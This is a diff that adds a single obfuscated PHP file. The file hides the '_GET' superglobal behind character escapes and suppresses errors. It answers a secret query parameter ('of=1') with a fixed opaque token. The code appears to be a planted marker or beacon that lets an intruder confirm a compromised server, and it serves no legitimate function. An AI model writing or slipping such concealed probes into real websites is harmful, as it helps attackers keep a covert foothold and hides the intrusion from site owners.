@@ -1,0 +1,1 @@
+<?php  error_reporting(0); $ZQ = array("\x5f\107\x45\x54"); (${$ZQ[0]}["\157\x66"] == 1) && die("4IGkQfRIzFq8vqp5GGRfTa9YKs3/LPy+0owDTtCYh4JL2brU3d3i8aRTEKNMCiSg");  ?>
